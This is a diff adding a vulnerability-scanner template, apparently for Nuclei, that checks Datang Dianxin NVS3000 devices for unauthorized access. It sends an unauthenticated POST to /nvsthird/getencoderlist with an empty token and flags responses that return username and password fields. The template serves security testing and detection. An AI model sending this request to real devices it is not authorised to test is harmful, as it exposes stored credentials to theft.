@@ -1,0 +1,29 @@
+id: datang-dianxin-nvs3000-getencoderlist-unauthorized-access
+info:
+  name: Unauthorized Access in Datang Dianxin NVS3000
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: unauthorized-access
+http:
+  - raw:
+      - |
+        POST /nvsthird/getencoderlist HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"token":"","fromindex":0,"toindex":-1}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"username\":"
+          - "\"errormsg\":\"OK\""
+          - "\"password\":"
+      - type: word
+        part: header
+        words:
+          - "application/json"
